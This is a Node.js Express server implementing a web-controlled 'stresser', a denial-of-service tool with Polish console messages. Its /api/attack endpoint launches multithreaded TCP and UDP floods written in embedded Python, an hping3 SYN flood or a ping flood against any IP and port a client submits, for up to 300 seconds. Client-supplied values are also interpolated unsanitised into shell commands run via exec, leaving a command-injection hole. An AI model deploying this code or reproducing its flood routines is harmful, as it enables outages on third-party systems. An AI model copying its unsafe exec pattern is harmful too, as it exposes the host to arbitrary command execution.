const express = require("express");
const path = require("path");
const { exec } = require("child_process");
const app = express();

app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

const activeAttacks = new Map();
const MAX_ATTACK_TIME = 300;

function runStressCommand(target, port, method, duration, res) {
    const attackId = Date.now().toString();
    
    let command;
    switch(method) {
        case 'TCP':
            command = `python3 -c "
import socket
import threading
import time
target = '${target}'
port = ${port}
duration = ${duration}
threads = 500
def flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(b'${'A'.repeat(1000)}')
            s.close()
        except: pass
for i in range(threads):
    threading.Thread(target=flood).start()
time.sleep(duration)
"`;
            break;
        case 'UDP':
            command = `python3 -c "
import socket
import threading
import time
target = '${target}'
port = ${port}
duration = ${duration}
threads = 800
data = b'${'B'.repeat(1470)}'
def flood():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            s.sendto(data, (target, port))
        except: pass
    s.close()
for i in range(threads):
    threading.Thread(target=flood).start()
"`;
            break;
        case 'SYN':
            command = `timeout ${duration} hping3 --flood -S -p ${port} ${target}`;
            break;
        default:
            command = `timeout ${duration} ping -f ${target}`;
    }

    const attackProcess = exec(command, (error, stdout, stderr) => {
        if (error && !error.killed) {
            console.log(`Attack ${attackId} error:`, error);
        }
        activeAttacks.delete(attackId);
    });

    activeAttacks.set(attackId, {
        process: attackProcess,
        target: target,
        port: port,
        method: method,
        startTime: Date.now(),
        duration: duration
    });

    setTimeout(() => {
        if (activeAttacks.has(attackId)) {
            activeAttacks.get(attackId).process.kill();
            activeAttacks.delete(attackId);
        }
    }, duration * 1000 + 5000);

    return attackId;
}

app.post("/api/attack", (req, res) => {
    const { target, method, duration } = req.body;
    
    if (!target || !method) {
        return res.status(400).json({ error: "Missing target or method" });
    }

    const attackDuration = Math.min(parseInt(duration) || 60, MAX_ATTACK_TIME);
    
    let [ip, port] = target.split(':');
    port = port || (method === 'HTTP' ? 80 : 80);

    try {
        const attackId = runStressCommand(ip, port, method, attackDuration, res);
        
        res.json({ 
            success: true, 
            message: `Attack started on ${target} with ${method} for ${attackDuration} seconds`,
            attackId: attackId
        });
    } catch (error) {
        res.status(500).json({ error: "Failed to start attack" });
    }
});

app.post("/api/stop", (req, res) => {
    const { attackId } = req.body;
    
    if (activeAttacks.has(attackId)) {
        activeAttacks.get(attackId).process.kill();
        activeAttacks.delete(attackId);
        res.json({ success: true, message: "Attack stopped" });
    } else {
        res.status(404).json({ error: "Attack not found" });
    }
});

app.get("/api/status", (req, res) => {
    const attacks = Array.from(activeAttacks.entries()).map(([id, data]) => ({
        id: id,
        target: data.target,
        port: data.port,
        method: data.method,
        startTime: data.startTime,
        duration: data.duration,
        elapsed: Math.floor((Date.now() - data.startTime) / 1000)
    }));
    
    res.json({ activeAttacks: attacks });
});

app.listen(3000, () => {
    console.log("Stresser działa na http://localhost:3000");
    console.log("Upewnij się że masz zainstalowane: nodejs, python3, hping3");
});